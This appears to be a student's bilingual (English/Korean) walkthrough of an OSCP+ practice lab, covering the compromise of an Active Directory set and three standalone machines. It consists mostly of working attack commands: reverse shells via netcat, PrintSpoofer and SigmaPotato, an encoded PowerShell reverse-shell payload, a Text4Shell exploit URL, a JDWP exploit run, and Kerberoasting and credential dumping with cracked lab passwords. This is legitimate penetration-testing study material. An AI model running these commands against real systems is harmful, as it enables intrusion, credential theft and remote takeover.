About this lab

This lab challenges learners to exploit exposed services and misconfigurations in an Active Directory environment. Starting with a Kerberoasting attack to crack service account credentials, learners perform lateral movement, configure SQL Server for command execution, and escalate privileges to NT AUTHORITY\SYSTEM using the SeImpersonatePrivilege. The exercise culminates in a domain compromise through hash extraction and reuse.

이 연구실에 대하여

본 실습은 학습자가 Active Directory 환경에서 노출된 서비스와 잘못된 구성을 악용하도록 합니다. 먼저 서비스 계정 자격 증명을 탈취하기 위한 Kerberoasting 공격부터 시작하여, 학습자는 측면 이동을 수행하고, SQL Server에서 명령 실행을 구성하고, SeImpersonatePrivilege를 사용하여 NT AUTHORITY\SYSTEM 계정으로 권한을 상승시킵니다. 마지막으로 해시 추출 및 재사용을 통해 도메인을 침해하는 것으로 실습이 마무리됩니다.

Lab Description

This lab immerses learners in a realistic Active Directory environment where exposed services and misconfigurations pave the way to a full domain compromise. Starting with service enumeration, learners identify vulnerable entry points and exploit a web application for initial access. From there, they escalate privileges locally and launch a Kerberoasting attack to extract and crack service account credentials. These credentials enable lateral movement and remote command execution via a misconfigured SQL Server. Finally, learners escalate to NT AUTHORITY\SYSTEM using SeImpersonatePrivilege and extract domain admin credentials to complete the compromise.

This lab is ideal for red teamers, penetration testers, and cybersecurity professionals focused on enterprise environments. Participants will strengthen their skills in enumeration, Kerberoasting, lateral movement, privilege escalation, and credential harvesting—making it a valuable exercise for anyone pursuing advanced offensive security capabilities or Active Directory exploitation techniques.

이 실습은 학습자가 노출된 서비스와 잘못된 구성으로 인해 도메인 전체가 침해당하는 실제 Active Directory 환경에 몰입할 수 있도록 합니다. 서비스 열거부터 시작하여 취약한 진입점을 식별하고 웹 애플리케이션을 악용하여 초기 접근 권한을 획득합니다. 그 후 로컬에서 권한을 상승시키고 Kerberoasting 공격을 실행하여 서비스 계정 자격 증명을 추출하고 크랙합니다. 이러한 자격 증명을 통해 잘못 구성된 SQL Server를 통해 측면 이동 및 원격 명령 실행이 가능해집니다. 마지막으로 SeImpersonatePrivilege 명령어를 사용하여 NT AUTHORITY\SYSTEM 계정으로 권한을 상승시키고 도메인 관리자 자격 증명을 추출하여 침해를 완료합니다.

이 실습은 레드팀, 침투 테스터 및 엔터프라이즈 환경에 집중하는 사이버 보안 전문가에게 이상적입니다. 참가자들은 열거, 케버로스팅, 측면 이동, 권한 상승 및 자격 증명 수집 기술을 강화할 수 있으므로 고급 공격 보안 기능 또는 Active Directory 공격 기법을 배우고자 하는 모든 사람에게 유용한 훈련입니다.



Learning Objectives

## After completing this lab, learners will be able to:

- Enumerate exposed services using Nmap to identify potential entry points, including web applications and FTP.
- Exploit a vulnerable web application to gain initial access and escalate privileges locally.
- Perform Kerberoasting to extract and crack service account credentials, leveraging them for lateral movement.
- Exploit SQL Server misconfigurations to achieve remote command execution and escalate privileges.
- Extract domain administrator credentials and achieve full domain compromise through tools like Mimikatz.
## 이 실습을 완료하면 학습자는 다음을 수행할 수 있게 됩니다.

- Nmap을 사용하여 노출된 서비스를 열거하고 웹 애플리케이션 및 FTP를 포함한 잠재적인 진입점을 식별합니다.
- 취약한 웹 애플리케이션을 악용하여 초기 접근 권한을 획득하고 로컬에서 권한을 상승시키세요.
- 케르베로스팅 공격을 수행하여 서비스 계정 자격 증명을 추출하고 해독한 후, 이를 이용하여 측면 이동을 시도합니다.
- SQL Server의 잘못된 구성을 악용하여 원격 명령 실행 및 권한 상승을 달성하십시오.
- Mimikatz와 같은 도구를 사용하여 도메인 관리자 자격 증명을 추출하고 도메인 전체를 장악할 수 있습니다.


**10.10.81.146**

과제 5 - DC01 OS 자격 증명:

```
No credentials were provided for this machine
```

**192.168.121.147**

과제 5 - MS01 OS 자격 증명:

```
Eric.Wallows / EricLikesRunning800
```

**10.10.81.148**

과제 5 - MS02 OS 자격 증명:

```
No credentials were provided for this machine
```

**192.168.121.149**

과제 5 - Kiero OS 자격 증명:

```
No credentials were provided for this machine
```

**192.168.121.150**

챌린지 5 - 베를린 OS 자격 증명:

```
No credentials were provided for this machine
```

**192.168.121.151**

과제 5 - Gust OS 자격 증명:

```
No credentials were provided for this machine
```



##### 

Objectives

This is the second of three dedicated OSCP Challenge Labs. It is composed of six six OSCP+ machines. The intention of this Challenge is to provide a mock-exam experience that closely reflects a similar level of difficulty to that of the actual OSCP+ exam.

The challenge contains three machines that are connected via Active Directory, and another three standalone machines that do not have any dependencies or intranet connections. All of the standalone machines have a `local.txt` and a `proof.txt` flag, however the Active Directory set only has a `proof.txt` on the Domain Controller. While the Challenge Labs have no point values, on the exam the standalone machines would be worth 20 points each for a total of 60 points. The Active Directory set is worth 40 points all together.

To align with the OSCP+ 'Assumed Breach' scenario for the Active Directory portion of the exam, please use the credentials below for initial access: Username: Eric.Wallows Password: EricLikesRunning800

All the intended attack vectors for these machines are taught in the PEN-200 Modules, or are leveraged in PEN-200 Challenge Labs 1-3. However, the specific requirements to trigger the vulnerabilities may differ from the exact scenarios and techniques demonstrated in the course material. You are expected to be able to take the demonstrated exploitation techniques and modify them for the current environment.

Please feel free to complete this challenge at your own pace. While the OSCP+ exam lasts for 23:45 hours, it is designed so that the machines can be successfully attacked in much less time. While each student is different, we highly recommend that you plan to spend a significant amount of time resting, eating, hydrating, and sleeping during your exam. Thus, we explicitly **do not** recommend that you attempt to work on this Challenge Lab for 24 hours straight.

We recommend that you begin with a network scan on all the provided IP addresses, and then enumerate each machine based on the results. When you are finished with the Challenge, we suggest that you create a mock-exam report for your own records, according to the advice provided in the Report Writing for Penetration Testers Module.

Good luck!

##### 

목표

이것은 세 개의 OSCP 챌린지 랩 중 두 번째 랩입니다. 총 6개의 OSCP+ 머신으로 구성되어 있습니다. 이 챌린지의 목적은 실제 OSCP+ 시험과 유사한 난이도의 모의 시험 환경을 제공하는 것입니다.

이 과제는 Active Directory로 연결된 세 대의 컴퓨터와, 종속성이나 인트라넷 연결이 없는 세 대의 독립 실행형 컴퓨터로 구성됩니다. 모든 독립 실행형 컴퓨터에는 및 `local.txt`플래그 가 설정되어 있지만 `proof.txt`, Active Directory로 연결된 컴퓨터 세트에는 `proof.txt`도메인 컨트롤러에만 플래그가 설정되어 있습니다. 과제 랩에는 점수가 부여되지 않지만, 시험에서는 독립 실행형 컴퓨터가 각각 20점씩, 총 60점의 배점을 받게 됩니다. Active Directory로 연결된 컴퓨터 세트는 총 40점의 배점을 갖습니다.

OSCP+ 시험의 Active Directory 부분에 대한 '가정된 침해' 시나리오에 맞춰 초기 접속 시 아래 자격 증명을 사용하십시오. 사용자 이름: Eric.Wallows 비밀번호: EricLikesRunning800

이러한 시스템에 대한 모든 공격 벡터는 PEN-200 모듈에서 다루어지거나 PEN-200 챌린지 랩 1~3에서 활용됩니다. 그러나 취약점을 발생시키기 위한 구체적인 요구 사항은 강의 자료에서 시연된 시나리오 및 기법과 다를 수 있습니다. 따라서 수강생은 제시된 공격 기법을 현재 환경에 맞게 수정하여 적용할 수 있어야 합니다.

이 챌린지는 본인의 속도에 맞춰 자유롭게 진행하셔도 됩니다. OSCP+ 시험은 23시간 45분 동안 진행되지만, 실제 시험 환경은 훨씬 짧은 시간 안에 공략할 수 있도록 설계되었습니다. 개인마다 상황이 다르겠지만, 시험 중에는 충분한 휴식, 식사, 수분 섭취, 수면 시간을 확보하는 것이 좋습니다. 따라서 이 챌린지 랩을 24시간 내내 풀려고 시도하는 것은 권장 **하지 않습니다 .**

제공된 모든 IP 주소에 대해 네트워크 스캔을 수행한 다음, 결과를 바탕으로 각 머신을 열거하는 것으로 시작하는 것이 좋습니다. 과제를 완료한 후에는 침투 테스터를 위한 보고서 작성 모듈의 조언에 따라 모의 시험 보고서를 작성하여 기록으로 남겨두는 것이 좋습니다.

행운을 빌어요!


# Active Directory 설정
## 192.168.162.147 - MS01

`Eric.Wallows / EricLikesRunning800`

## Nmap
![[Pasted image 20260112130302.png]]

## Initial Access
```bash
evil-winrm -i 192.168.121.147 -u 'Eric.wallows' -p 'EricLikesRunning800'
```
![[Pasted image 20260112133602.png]]

## Privilege Escalation
"Confirmed that **`SeImpersonatePrivilege`** is enabled for the current user, providing a direct vector for **privilege escalation** to SYSTEM."
- (번역: 현재 사용자에게 **`SeImpersonatePrivilege`** 권한이 활성화된 것을 확인했으며, 이는 SYSTEM으로의 **권한 상승**을 위한 직접적인 경로를 제공합니다.)
```powershell
- whoami /priv
```
![[Pasted image 20260112133657.png]]

"Verified that the **`spoolsv`** (Print Spooler) service is **running** on the target system."
- (번역: 대상 시스템에서 **`spoolsv`** (Print Spooler) 서비스가 **실행 중**임을 확인했습니다.)
```powershell
ps | findstr spoolsv
```

![[Pasted image 20260112133824.png]]


```powershell
upload PrintSpoofer64.exe
upload nc64.exe
```
![[Pasted image 20260112134409.png]]![[Pasted image 20260112134423.png]]

"Executed **`PrintSpoofer64.exe`** to trigger **`nc64.exe`**, successfully establishing a **SYSTEM-level reverse shell**."
- (번역: **`PrintSpoofer64.exe`**를 실행하여 **`nc64.exe`**를 트리거했으며, **SYSTEM 수준의 리버스 셸**을 성공적으로 수립했습니다.)
```powershell
.\PrintSpoofer64.exe -c "nc64.exe 192.168.45.176 9999 -e powershell"
```
![[Pasted image 20260112134824.png]]

```bash
rlwrap nc -lnvp 9999
```
![[Pasted image 20260112134903.png]]

## Post-Exploitation

"Added **Eric.Wallows** to the **local Administrators group**, granting the account full administrative privileges."
- (번역: **Eric.Wallows**를 **로컬 관리자 그룹**에 추가하여 해당 계정에 전체 관리자 권한을 부여했습니다.)
```powershell
net localgroup Administrators Eric.Wallows /add
```
![[Pasted image 20260112135145.png]]

"Enumerated both **local and domain user accounts** to identify potential targets for lateral movement."
- (번역: 수평 이동의 잠재적 대상을 식별하기 위해 **로컬 및 도메인 사용자 계정**을 모두 열거했습니다.)

```powershell
net user
net user /domain
```
![[Pasted image 20260112135417.png]]


"Utilized **NetExec** with the **`lsassy`** module to dump memory credentials, successfully retrieving **NTLM hashes** for the **web_svc** and **Administrator** accounts."
- (번역: **NetExec**의 **`lsassy`** 모듈을 활용해 메모리 자격 증명을 덤프하여, **web_svc** 및 **Administrator** 계정의 **NTLM 해시**를 성공적으로 획득했습니다.)
```bash
nxc smb 192.168.121.147 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy
```
![[Pasted image 20260112135847.png]]

"Utilized **Impacket's secretsdump** to dump **local SAM hashes**, successfully extracting credentials for local user accounts."
- (번역: **Impacket의 secretsdump**를 활용해 **로컬 SAM 해시**를 덤프하여 로컬 사용자 계정의 자격 증명을 성공적으로 추출했습니다.)
```bash
impacket-secretsdump oscp.exam/Eric.Wallows:"EricLikesRunning800"@192.168.121.147
```
![[Pasted image 20260112140240.png]]

"Recovered **plain-text credentials** from **NTLM hashes** via an offline brute-force attack using **Hashcat**."
- (번역: **Hashcat**을 이용한 오프라인 브루트포스 공격을 통해 **NTLM 해시**에서 **평문 자격 증명**을 복구했습니다.)
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --quiet
```
![[Pasted image 20260112141432.png]]

```powershell
route print
```
![[Pasted image 20260112142044.png]]


"The **`ligolo-ng` proxy server** was initiated on the Kali Linux attacker machine to facilitate **network pivoting**."
- (번역: 네트워크 피보팅을 원활하게 하기 위해 Kali Linux 공격자 머신에서 **`ligolo-ng` 프록시 서버**를 실행했습니다.)
```bash
sudo ./proxy -selfcert 
#execute agent
session #1
ifcreate 10.10.203.0
route_add --name 10.10.81.0 --route 10.10.81.0/24
start --tun 10.10.81.0
```

```powershell
.\agent.exe -connect 192.168.45.176:11601 -ignore-cert
```
![[Pasted image 20260112142222.png]]



## 10.10.81.148 -MS02
## Nmap
![[Pasted image 20260112142838.png]]

## Lateral Movement(MS01 to MS02)
"A **Kerberoasting attack** was executed using **`impacket-GetUserSPNs`**, successfully retrieving **TGS hashes** for the **sql_svc** and **web_svc** service accounts."
- (번역: **`impacket-GetUserSPNs`**를 사용하여 **Kerberoasting** 공격을 수행하였으며, **sql_svc** 및 **web_svc** 서비스 계정에 대한 **TGS 해시**를 성공적으로 획득했습니다.)
```bash
impacket-GetUserSPNs -request -dc-ip 10.10.81.146 oscp.exam/eric.wallows
```
![[Pasted image 20260112143039.png]]


"The captured **TGS hashes** were successfully **cracked offline**, recovering the **cleartext passwords** for the identified service accounts."
- (번역: 획득한 **TGS 해시**를 성공적으로 **오프라인 크래킹**하여, 식별된 서비스 계정들의 **평문 암호**를 복구했습니다.)
- web_svc: Diamond1
- sql_svc: Dolphin1
```bash
hashcat -m 13100 spn_hash.hash /usr/share/wordlists/rockyou.txt --show
```
![[Pasted image 20260112143611.png]]


"Successfully established a connection to the **MSSQL console** using the recovered **sql_svc** credentials."
- (번역: 복구된 **sql_svc** 자격 증명을 사용하여 **MSSQL 콘솔**에 성공적으로 연결했습니다.)
```bash
impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@10.10.81.148 -windows-auth
```
![[Pasted image 20260112143818.png]]

## Privilege Escalation

"Enabled **`xp_cmdshell`** via `sp_configure`, allowing for direct **Remote Code Execution** through the database console."
- (번역: `sp_configure`를 통해 **`xp_cmdshell`**을 활성화함으로써 데이터베이스 콘솔을 통한 직접적인 **원격 코드 실행(RCE)** 권한을 확보했습니다.)
```bash
EXEC sp_configure 'show advanced options', 1; -- priv
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
![[Pasted image 20260112143959.png]]

"Confirmed that **`SeImpersonatePrivilege`** is enabled, providing a direct vector for **privilege escalation** to SYSTEM via token impersonation."
- (번역: **`SeImpersonatePrivilege`** 권한이 활성화된 것을 확인했으며, 이는 토큰 위조를 통한 SYSTEM으로의 **권한 상승** 직접 경로를 제공합니다.)

```MSSQL
EXEC xp_cmdshell 'whoami /priv'
```
![[Pasted image 20260112150848.png]]

"Generated a custom **reverse shell executable (`payload.exe`)** to establish a callback from the target host."
- (번역: 대상 호스트로부터 콜백을 수립하기 위해 커스텀 **리버스 셸 실행 파일(`payload.exe`)**을 생성했습니다.)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=8000 -f exe -o payload.exe
```
![[Pasted image 20260112151034.png]]

"Established **port forwarding** via **`ligolo-ng`**, enabling access to internal services through the established tunnel."
- (번역: 수립된 터널을 통해 내부 서비스에 접근할 수 있도록 **`ligolo-ng`**를 이용한 **포트 포워딩**을 설정했습니다.)
```bash
listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:9999
```
![[Pasted image 20260112151309.png]]

"The **`PrintSpoofer64.exe`** and **`nc64.exe`** binaries were successfully **downloaded** to the target machine for the final privilege escalation attempt."
- (번역: 최종 권한 상승 시도를 위해 **`PrintSpoofer64.exe`** 및 **`nc64.exe`** 바이너리를 대상 머신에 성공적으로 **다운로드**했습니다.)

```MSSQL
EXEC xp_cmdshell 'powershell -c "curl.exe http://10.10.81.147:9999/PrintSpoofer64.exe -o C:\Users\Public\PrintSpoofer64.exe"';
```
```
EXEC xp_cmdshell 'powershell -c "curl.exe http://10.10.81.147:9999/nc64.exe -o C:\Users\Public\nc64.exe"';
```

![[Pasted image 20260112153702.png]]
"Executed **`PrintSpoofer64.exe`** to exploit **`SeImpersonatePrivilege`**, successfully establishing a **reverse shell** with **SYSTEM privileges**."
- (번역: **`SeImpersonatePrivilege`**를 악용하기 위해 **`PrintSpoofer64.exe`**를 실행하였으며, **SYSTEM 권한**의 **리버스 셸** 연결을 성공적으로 수립했습니다.)
```
exec xp_cmdshell 'C:\Users\Public\PrintSpoofer64.exe -c "nc64.exe 10.10.81.147 9999 -e powershell"';
```
![[Pasted image 20260112153859.png]]


![[Pasted image 20260112154500.png]]


## Post-Exploitation


```powershell
iwr http://10.10.81.147:9999/mimikatz.exe -o mimikatz.exe
#mimikatz
privilege::debug
sekurlsa::logonpasswords
```

![[Pasted image 20260112155507.png]]
## 10.10.119.146 - DC01
## leteral Movement

"Established an **administrative session** on **DC01** using the **Administrator's NTLM hash** through **WinRM**."
- (번역: **Administrator의 NTLM 해시**를 사용하여 **WinRM**을 통해 **DC01**에 대한 **관리자 세션**을 수립했습니다.)

```bash
evil-winrm -i 10.10.81.146 -u 'Administrator' -H '59b280ba707d22e3ef0aa587fc29ffe5'
```
![[Pasted image 20260112160331.png]]



Retrieve proof.txt

![[Pasted image 20260112160430.png]]
# Independent Challenges

## 192.168.162.149 - Kiero
## Nmap
```bash
nmap -sS -sU --min-rate 5000 192.168.121.149 -oG 192.168.121.149.log 
```

![[Pasted image 20260112170656.png]]

## Initial Access 
"Successfully identified the **SNMP community string** as **'public'** using **Hydra**, enabling further information gathering via SNMP enumeration."
- (번역: **Hydra**를 사용하여 **SNMP 커뮤니티 문자열**이 **'public'**임을 성공적으로 식별하였으며, 이를 통해 SNMP 열거를 통한 추가 정보 수집이 가능해졌습니다.)
```bash
hydra -P /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://192.168.121.149
```

![[Pasted image 20260112172256.png]]


"Enumerated **SNMP data** using **`snmpwalk`**, revealing that user **'Kiero'**'s password was reset to a default value and identifying an additional user, **'john'**."

- (번역: **`snmpwalk`**를 사용하여 **SNMP 데이터**를 열거한 결과, 사용자 **'Kiero'**의 비밀번호가 기본값으로 재설정된 사실을 확인했으며 추가 사용자 **'john'**을 식별했습니다.)

```bash
snmpwalk -v2c -c public 192.168.121.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
![[Pasted image 20260112173132.png]]

"Successfully authenticated to the **FTP service** using the identified default credentials (**`kiero:kiero`**)."

- (번역: 식별된 기본 자격 증명(**`kiero:kiero`**)을 사용하여 **FTP 서비스** 인증에 성공했습니다.)
```bash
ftp 192.168.121.149
```
![[Pasted image 20260112173348.png]]

"Exfiltrated an **`id_rsa`** private key from the target, providing a direct vector for **SSH-based lateral movement**."

- (번역: 타겟으로부터 **`id_rsa`** 개인 키를 추출하였으며, 이를 통해 **SSH 기반의 수평 이동**을 위한 직접적인 경로를 확보했습니다.)
```ftp
get id_rsa
```

![[Pasted image 20260112173433.png]]


"Established an interactive **SSH session** as **'john'** by leveraging the exfiltrated **private key**."

- (번역: 추출된 **개인 키**를 활용하여 **'john'** 계정으로 대화형 **SSH 세션**을 수립했습니다.)

```bash
chmod 600 id_rsa
ssh john@192.168.121.149 -i id_rsa
```


![[Pasted image 20260112173644.png]]


Retrieve local.txt

![[Pasted image 20260112173701.png]]
## Privilege Escalation

"Executed **`linpeas.sh`** for local enumeration, identifying multiple **exploitable CVEs** as potential vectors for root escalation."

- (번역: 로컬 열거를 위해 **`linpeas.sh`**를 실행하였으며, root 권한 상승의 잠재적 경로로서 악용 가능한 여러 **CVE**를 식별했습니다.)

![[Pasted image 20260112174053.png]]


"Successfully leveraged **CVE-2022-0847 (Dirty Pipe)** to overwrite sensitive system files, achieving **full compromise with root privileges**."
- (번역: **CVE-2022-0847 (Dirty Pipe)**를 악용하여 민감한 시스템 파일을 덮어썼으며, 이를 통해 **root 권한의 완전한 장악**을 달성했습니다.)
- [https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)


![[Pasted image 20260112174457.png]]

![[Pasted image 20260112174533.png]]


## 192.168.162.150 - Berlin

## Nmap 
![[Pasted image 20260113094942.png]]

## Initial Access

"Performed **directory enumeration** using **`gobuster`**, successfully identifying several **accessible paths** for further web application analysis."
- (번역: **`gobuster`**를 사용하여 **디렉터리 열거**를 수행하였으며, 추가적인 웹 애플리케이션 분석을 위한 여러 **접근 가능한 경로**를 성공적으로 식별했습니다.)
```bash
gobuster dir -u http://192.168.162.150:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

![[Pasted image 20260113095900.png]]
"Accessed the **`/CHANGELOG`** endpoint and identified the use of **Apache Commons Text 1.8**, confirming susceptibility to **Text4Shell (CVE-2022-42889)**."
- (번역: **`/CHANGELOG`** 엔드포인트에 접근하여 **Apache Commons Text 1.8** 사용을 확인했으며, 이를 통해 **Text4Shell (CVE-2022-42889)** 취약점에 노출되어 있음을 파악했습니다.)

```bash
curl http://192.168.162.150:8080/CHANGELOG
```

![[Pasted image 20260113101034.png]]

"The **Text4Shell (CVE-2022-42889)** POC exploit was successfully executed, establishing a **reverse shell connection** and providing initial access to the target server."
- (번역: **Text4Shell (CVE-2022-42889)** POC 익스플로잇이 성공적으로 실행되어, **역방향 셸(Reverse Shell)** 연결이 수립되었으며 대상 서버에 대한 초기 접근 권한을 획득했습니다.)
```bash
curl http://192.168.162.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27busybox%20nc%20192.168.45.233%204444%20-e%20%2fbin%2fbash%27%29%7D%25

#script /dev/null -c /bin/bash
```
![[Pasted image 20260113101731.png]]

![[Pasted image 20260113101715.png]]
## Privilege Escalation

"Identified a **vulnerable JDWP service** running as **root** on **port 8000**, providing a direct vector for **Privilege Escalation via RCE**."
- (번역: **root 권한**으로 8000번 포트에서 실행 중인 **취약한 JDWP 서비스**를 식별했으며, 이는 **RCE를 통한 권한 상승**의 직접적인 경로를 제공합니다.)

```bash
- java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
```
![[Pasted image 20260113110703.png]]


"Acquired the **JDWP exploit script** and prepared the environment for execution against the target service on **port 8000**."
- (번역: **8000번 포트**의 타겟 서비스를 공격하기 위해 **JDWP 익스플로잇 스크립트**를 확보하고 실행 환경 구성을 완료했습니다.)
- [https://www.exploit-db.com/exploits/46501](https://www.exploit-db.com/exploits/46501)
![[Pasted image 20260113110829.png]]
```bash
ssh -f -N -R 8000:localhost:8000 kali@192.168.45.233
```


![[Pasted image 20260113111011.png]]

리버스쉘 실행
![[Pasted image 20260113111557.png]]
poc 실행
```bash
python2 46501.py -t 127.0.0.1 -p 8000 --cmd 'busybox nc 192.168.45.233 9999 -e sh'
```
![[Pasted image 20260113111627.png]]
"Connected to **port 5000** to **trigger a Java event**, satisfying the breakpoint requirement for the **JDWP exploit** to execute the payload."
- (번역: **JDWP 익스플로잇**의 페이로드 실행에 필요한 브레이크포인트 조건을 충족하기 위해, **5000번 포트**에 연결하여 **자바 이벤트를 트리거**했습니다.)
```bash
ss -nltp
```
![[Pasted image 20260113111713.png]]
"Successfully compromised the **JDWP service** by triggering a Java event, resulting in an interactive **reverse shell** with **root privileges**."
- (번역: 자바 이벤트를 트리거하여 **JDWP 서비스**를 성공적으로 장악하였으며, 그 결과 **root 권한**의 대화형 **역방향 셸**을 획득했습니다.)
![[Pasted image 20260113111820.png]]
![[Pasted image 20260113111848.png]]


## 192.168.162.151 - Gust
## Nmap
![[Pasted image 20260113112512.png]]

## Initial Access

"Identified the **FreeSWITCH mod_event_socket** on **port 8021**, confirming susceptibility to **Remote Code Execution (RCE)** via default credentials or command injection."
- (번역: **8021번 포트**에서 **FreeSWITCH mod_event_socket**을 식별하였으며, 기본 자격 증명 또는 명령 주입을 통한 **원격 코드 실행(RCE)** 취약점을 확인했습니다.)
- [https://www.exploit-db.com/exploits/47799](https://www.exploit-db.com/exploits/47799)
![[Pasted image 20260113112618.png]]
```bash
python 47799.py 192.168.162.151 whoami
```
![[Pasted image 20260113112747.png]]


"Obtained an interactive **reverse shell** via the **FreeSWITCH Event Socket exploit**, facilitating internal system enumeration."

- (번역: **FreeSWITCH 이벤트 소켓 익스플로잇**을 통해 대화형 **역방향 셸**을 획득하여 내부 시스템 열거가 가능한 상태가 되었습니다.)
```powershell
#powershell -e 기본 코드
$client = New-Object System.Net.Sockets.TCPClient('192.168.45.210',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

powershell -e bash UTF-16LE 인코딩

```bash
echo -n '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.210",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w 0
```
인코딩 후

```bash
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAwACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

![[Pasted image 20260114095127.png]]

![[Pasted image 20260114095211.png]]

![[Pasted image 20260114095311.png]]


## Privilege Escalation
"Identified **`SeImpersonatePrivilege`**, indicating vulnerability to **Potato-family exploits** for local privilege escalation."
- (번역: **`SeImpersonatePrivilege`**를 식별했습니다. 이는 로컬 권한 상승을 위한 **Potato 계열 익스플로잇**에 취약함을 나타냅니다.)
```powershell
whoami /priv
```

![[Pasted image 20260114095401.png]]

"Executed **`SigmaPotato.exe`** to exploit **`SeImpersonatePrivilege`**, successfully elevating privileges to **NT AUTHORITY\SYSTEM** and establishing a high-privileged **reverse shell**."
- (번역: **`SeImpersonatePrivilege`**를 악용하기 위해 **`SigmaPotato.exe`**를 실행하였으며, **NT AUTHORITY\SYSTEM**으로 권한을 상승시켜 높은 권한의 **역방향 셸**을 성공적으로 수립했습니다.)
```powershell
.\SigmaPotato.exe 'nc64.exe 192.168.45.210 9999 -e cmd.exe'
```
![[Pasted image 20260114100441.png]]


Retrieve proof.txt

![[Pasted image 20260114100552.png]]

